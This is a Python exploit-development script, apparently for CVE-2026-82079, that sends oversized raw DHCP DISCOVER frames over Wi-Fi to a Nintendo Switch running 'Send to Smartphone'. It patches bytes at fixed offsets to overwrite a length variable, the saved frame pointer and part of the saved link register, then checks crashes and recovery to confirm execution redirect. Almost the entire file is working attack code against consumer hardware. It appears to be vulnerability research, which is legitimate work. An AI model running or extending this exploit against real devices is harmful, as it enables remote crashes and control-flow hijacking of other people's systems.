#!/usr/bin/env -S sudo python3 -u -I
"""
CVE-2026-82079: LR redirect test v4.

Fixes:
  - Checksums computed AFTER patches
  - MTU reset to 2304 after every crash recovery
  - Diagnostic: does early DHCP END marker affect copy size?

Test plan:
  [0] Baseline 300B
  [1] 1668B no patches — KNOWN crash (sanity)
  --- recovery + MTU reset ---
  [2] 1668B, end marker at 1659, no local_48 patch
      If crash → copy is full frame (end marker doesn't truncate)
      If alive → end marker truncates copy → need different approach
  --- recovery + MTU reset ---
  [3] 1668B, end marker at 1659, local_48=0xf0
      If copy is full frame: local_48 set to 0xf0 → no crash
  --- if copy is full frame, proceed to LR tests ---
  [4] 1678B, end marker at 1659, local_48=0xf0, FP=0, LR byte0=0x24
      Control: original LR → should survive
  [5] 1678B, end marker at 1659, local_48=0xf0, FP=0, LR=[0x4c,0xd0]
      Redirect: pivot LR → should crash (SP=0 from corrupted FP)
"""

import socket
import struct
import time
import os
import json
import sys
import threading
import subprocess
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')
ETH_IP_UDP = 42

LOCAL_48_OFFSET = 1660
SAVED_FP_OFFSET = 1668
SAVED_LR_OFFSET = 1676
DHCP_END_EARLY = 1659


def ensure_mtu():
    """Set MTU to 2304 if needed."""
    with open(f'/sys/class/net/{IFACE}/mtu') as f:
        mtu = int(f.read().strip())
    if mtu < 2304:
        print(f"    [MTU {mtu} → setting 2304]")
        subprocess.run(['ip', 'link', 'set', IFACE, 'mtu', '2304'],
                       check=True, capture_output=True)
        time.sleep(0.5)
    return 2304


def get_mac(iface):
    with open(f'/sys/class/net/{iface}/address') as f:
        return bytes.fromhex(f.read().strip().replace(':', ''))


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def udp_checksum(src_ip, dst_ip, udp_hdr_no_cksum, payload):
    pseudo = struct.pack('!4s4sBBH', src_ip, dst_ip, 0, 17,
                         len(udp_hdr_no_cksum) + len(payload))
    data = pseudo + udp_hdr_no_cksum + payload
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    result = ~s & 0xffff
    return result if result else 0xffff


def build_frame(our_mac, total_frame_size, patches=None):
    """Build DHCP DISCOVER. Patches applied BEFORE checksums."""
    xid = int.from_bytes(os.urandom(4), 'big')

    bootp = struct.pack('!BBBBI HH', 1, 1, 6, 0, xid, 0, 0x8000)
    bootp += b'\x00' * 16
    bootp += our_mac + b'\x00' * 10
    bootp += b'\x00' * 64
    bootp += b'\x00' * 128
    assert len(bootp) == 236

    opts = struct.pack('!I', 0x63825363)
    opts += bytes([53, 1, 1])
    opts += bytes([55, 4, 1, 3, 6, 15])

    total_dhcp = total_frame_size - ETH_IP_UDP
    current = len(bootp) + len(opts) + 1
    pad = max(0, total_dhcp - current)
    opts += b'\x00' * pad
    opts += bytes([255])

    dhcp = bytearray(bootp + opts)

    if patches:
        for offset, value in patches.items():
            if isinstance(value, int):
                value = struct.pack('<Q', value)
            dhcp_offset = offset - ETH_IP_UDP
            if 0 <= dhcp_offset < len(dhcp):
                end = dhcp_offset + len(value)
                if end <= len(dhcp):
                    dhcp[dhcp_offset:end] = value

    dhcp = bytes(dhcp)
    udp_len = 8 + len(dhcp)
    src_ip = socket.inet_aton('0.0.0.0')
    dst_ip = socket.inet_aton('255.255.255.255')

    udp_no_ck = struct.pack('!HHH', 68, 67, udp_len) + b'\x00\x00'
    uck = udp_checksum(src_ip, dst_ip, udp_no_ck, dhcp)
    udp_hdr = struct.pack('!HHHH', 68, 67, udp_len, uck)

    ip_total = 20 + udp_len
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         0x45, 0x00, ip_total,
                         xid & 0xffff, 0x4000, 64, 17, 0,
                         src_ip, dst_ip)
    ick = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ick) + ip_hdr[12:]

    eth_hdr = b'\xff\xff\xff\xff\xff\xff' + our_mac + struct.pack('!H', 0x0800)
    return eth_hdr + ip_hdr + udp_hdr + dhcp, xid


class DhcpSniffer:
    def __init__(self, iface):
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(0x0800))
        self.sock.bind((iface, 0))
        self.sock.settimeout(0.2)
        self.responses = []
        self._run = False
        self._thread = None

    def start(self):
        self._run = True
        self.responses = []
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._run = False
        if self._thread:
            self._thread.join(timeout=2)
        try:
            self.sock.close()
        except Exception:
            pass

    def clear(self):
        self.responses.clear()

    def _loop(self):
        while self._run:
            try:
                data = self.sock.recv(4096)
                if len(data) < 42:
                    continue
                if struct.unpack('!H', data[12:14])[0] != 0x0800:
                    continue
                if data[23] != 17:
                    continue
                sp, dp = struct.unpack('!HH', data[34:38])
                if sp == 67 and dp == 68 and data[42] == 2:
                    xid_val = struct.unpack('!I', data[46:50])[0]
                    yiaddr = socket.inet_ntoa(data[58:62])
                    self.responses.append({
                        'xid': xid_val,
                        'yiaddr': yiaddr,
                        'size': len(data),
                    })
            except socket.timeout:
                continue
            except Exception:
                continue


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def wait_for_http(max_wait=200):
    """Wait for HTTP to come back after crash. Re-sets MTU."""
    t0 = time.monotonic()
    print(f"    Waiting for recovery (up to {max_wait}s)...")
    for _ in range(max_wait * 2):
        time.sleep(0.5)
        if check_http(timeout=2):
            elapsed = time.monotonic() - t0
            print(f"    Recovered in {elapsed:.1f}s")
            ensure_mtu()
            time.sleep(0.5)
            return round(elapsed, 1)
    print(f"    No recovery in {max_wait}s")
    return None


def recreate_raw_socket():
    """Create a fresh raw TX socket (old one may be dead after MTU change)."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                      socket.htons(0x0800))
    s.bind((IFACE, 0))
    return s


def run_test(raw_tx_holder, sniffer, our_mac, num, label, size, patches, expect):
    """Run one test. raw_tx_holder is a list [socket] so we can replace it."""
    if not check_http():
        print(f"    HTTP down — waiting for recovery...")
        rec = wait_for_http()
        if rec is None:
            return {'test': label, 'skipped': True, 'reason': 'no_recovery'}
        # Recreate raw socket after MTU change
        try:
            raw_tx_holder[0].close()
        except Exception:
            pass
        raw_tx_holder[0] = recreate_raw_socket()
        time.sleep(1)

    ensure_mtu()
    sniffer.clear()
    frame, xid = build_frame(our_mac, size, patches)

    # Print frame details
    details = f"    {size}B"
    if size > LOCAL_48_OFFSET + 7:
        l48 = struct.unpack_from('<Q', frame, LOCAL_48_OFFSET)[0]
        details += f", local_48=0x{l48:x}"
    if size > SAVED_FP_OFFSET + 7:
        fp = struct.unpack_from('<Q', frame, SAVED_FP_OFFSET)[0]
        details += f", FP=0x{fp:x}"
    if size > SAVED_LR_OFFSET + 1:
        details += f", LR=[0x{frame[SAVED_LR_OFFSET]:02x},0x{frame[SAVED_LR_OFFSET+1]:02x}]"
    # Show where the DHCP end marker is
    dhcp_start = ETH_IP_UDP
    for i in range(size - 1, dhcp_start + 240, -1):
        if frame[i] == 0xFF:
            details += f", END@{i}"
            break
    print(details)

    try:
        raw_tx_holder[0].send(frame)
    except OSError as e:
        print(f"    Send failed: {e}")
        print(f"    Recreating socket and retrying...")
        ensure_mtu()
        raw_tx_holder[0].close()
        raw_tx_holder[0] = recreate_raw_socket()
        time.sleep(0.5)
        raw_tx_holder[0].send(frame)

    time.sleep(3.0)

    matching = [r for r in sniffer.responses if r['xid'] == xid]
    dhcp_ok = len(matching) > 0
    alive = check_http()

    dhcp_str = f"DHCP={'reply' if dhcp_ok else 'none':5s}"
    http_str = f"HTTP={'ALIVE' if alive else 'DOWN':5s}"
    match = "OK" if (alive == (expect == 'alive')) else "UNEXPECTED"

    print(f"    {dhcp_str}  {http_str}  [{match}] (expected {expect})")

    result = {
        'test': label,
        'frame_size': size,
        'http_alive': alive,
        'dhcp_response': dhcp_ok,
        'expected': expect,
        'match': match == 'OK',
    }

    if not alive:
        rec = wait_for_http()
        if rec:
            result['recovery_seconds'] = rec
            try:
                raw_tx_holder[0].close()
            except Exception:
                pass
            raw_tx_holder[0] = recreate_raw_socket()
        else:
            result['recovery_failed'] = True

    return result


def main():
    if os.geteuid() != 0:
        print("Requires root.")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    our_mac = get_mac(IFACE)
    ensure_mtu()

    alive = check_http()
    if not alive:
        print("HTTP down. Start Send to Smartphone on the Switch.")
        sys.exit(1)

    print("=" * 64)
    print("  LR REDIRECT TEST v4")
    print("=" * 64)
    print(f"  Interface: {IFACE}, MAC: {our_mac.hex(':')}")
    print(f"  HTTP: alive")
    print("=" * 64)
    print()

    raw_tx = [recreate_raw_socket()]
    sniffer = DhcpSniffer(IFACE)
    sniffer.start()
    time.sleep(0.5)

    results = []

    tests = [
        # --- PHASE 1: Sanity ---
        (0, 'baseline_300', 300, {}, 'alive'),

        (1, 'known_crash_1668', 1668, {}, 'crash'),

        # --- PHASE 2: Does early end marker affect copy size? ---
        # End marker at 1659, local_48 NOT patched → local_48 bytes are 0x00
        # (the standard 0xFF end marker at 1667 is replaced by our early one)
        # If copy reaches local_48 (1660+): local_48=0 → size=-0xf0 → crash
        # If copy stops at end marker (1659): local_48 unchanged → no crash
        (2, 'early_end_1668_no_l48_patch', 1668,
         {DHCP_END_EARLY: bytes([0xFF]),
          1667: bytes([0x00])},  # remove natural end marker
         'unknown'),

        # --- PHASE 3: Controlled overflow with early end marker ---
        # (only run if phase 2 shows copy is full frame)
        (3, 'early_end_1668_l48_f0', 1668,
         {DHCP_END_EARLY: bytes([0xFF]),
          LOCAL_48_OFFSET: 0xF0,
          1667: bytes([0x00])},
         'alive'),

        # --- PHASE 4: LR overwrite tests ---
        # Control: original LR bytes, end marker at 1659
        (4, 'control_1678_original_lr', 1678,
         {DHCP_END_EARLY: bytes([0xFF]),
          LOCAL_48_OFFSET: 0xF0,
          SAVED_FP_OFFSET: 0,
          SAVED_LR_OFFSET: bytes([0x24]),
          # byte 1677 is naturally 0xFF (end marker) = original LR byte 1
          # but we have early end at 1659 so this 0xFF is just data
          },
         'alive'),

        # Redirect: pivot LR bytes, end marker at 1659
        (5, 'redirect_1678_pivot_lr', 1678,
         {DHCP_END_EARLY: bytes([0xFF]),
          LOCAL_48_OFFSET: 0xF0,
          SAVED_FP_OFFSET: 0,
          SAVED_LR_OFFSET: bytes([0x4C, 0xD0])},
         'crash'),
    ]

    for num, label, size, patches, expect in tests:
        print(f"[{num}] {label}")
        r = run_test(raw_tx, sniffer, our_mac, num, label, size, patches, expect)
        results.append(r)
        print()

        if r.get('recovery_failed'):
            print("Cannot continue — no recovery.")
            break

        # Phase 2 decision point
        if label == 'early_end_1668_no_l48_patch':
            if r.get('http_alive'):
                print("  >>> Early end marker TRUNCATES the copy. <<<")
                print("  >>> Cannot use early end marker for overflow. <<<")
                print("  >>> Proceeding with no-early-end approach. <<<")
                # Replace remaining tests with no-early-end versions
                tests_replace = [
                    (3, 'no_early_end_1668_l48_f0', 1668,
                     {LOCAL_48_OFFSET: 0xF0},
                     'alive'),
                    # For redirect without early end: parser will encounter
                    # our patched bytes as DHCP options. Use 1679B frame so
                    # end marker falls at byte 1678 (after LR byte 1 at 1677).
                    # This overwrites LR byte 2 (0x09→0xFF) → unmapped addr → crash
                    (4, 'control_1678_original_lr', 1678,
                     {LOCAL_48_OFFSET: 0xF0, SAVED_FP_OFFSET: 0,
                      SAVED_LR_OFFSET: bytes([0x24])},
                     'alive'),
                    (5, 'redirect_1679_3byte_lr', 1679,
                     {LOCAL_48_OFFSET: 0xF0, SAVED_FP_OFFSET: 0,
                      SAVED_LR_OFFSET: bytes([0x4C, 0xD0])},
                     'crash'),
                ]
                # Clear remaining tests from the list and run replacements
                for rnum, rlabel, rsize, rpatches, rexpect in tests_replace:
                    print(f"[{rnum}] {rlabel}")
                    rr = run_test(raw_tx, sniffer, our_mac, rnum, rlabel,
                                  rsize, rpatches, rexpect)
                    results.append(rr)
                    print()
                    if rr.get('recovery_failed'):
                        break
                break  # done with main loop
            else:
                print("  >>> Early end marker does NOT truncate copy. <<<")
                print("  >>> Copy uses full frame size. Can use early end. <<<")

    sniffer.stop()
    try:
        raw_tx[0].close()
    except Exception:
        pass

    path = f"{EVIDENCE_DIR}/lr_redirect_v4_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'tests': results,
        }, f, indent=2)
    print(f"Evidence: {path}")

    print()
    print("=" * 64)
    print("  RESULTS")
    print("=" * 64)

    for r in results:
        if r.get('skipped'):
            status = 'SKIPPED'
        elif r.get('expected') == 'unknown':
            status = 'DIAGNOSTIC'
        elif r['match']:
            status = 'OK'
        else:
            status = '** UNEXPECTED **'
        alive_str = 'alive' if r.get('http_alive') else 'DOWN'
        rec_str = f" ({r['recovery_seconds']}s)" if 'recovery_seconds' in r else ''
        print(f"  {r['test']:40s} {alive_str:5s}{rec_str} {status}")

    # Key conclusions
    print()
    t4 = next((r for r in results if 'control' in r['test']), None)
    t5 = next((r for r in results if 'redirect' in r['test']), None)

    if t4 and t5:
        if t4.get('http_alive') and not t5.get('http_alive'):
            print("  *** EXECUTION REDIRECT CONFIRMED ***")
            print("  Original LR → alive, modified LR → crash.")
            print("  The partial overwrite at saved LR redirects execution.")
        elif t4.get('http_alive') and t5.get('http_alive'):
            print("  Both survived — LR overwrite not effective at this size.")
        elif not t4.get('http_alive') and not t5.get('http_alive'):
            print("  Both crashed — cannot distinguish LR effect.")


if __name__ == '__main__':
    main()
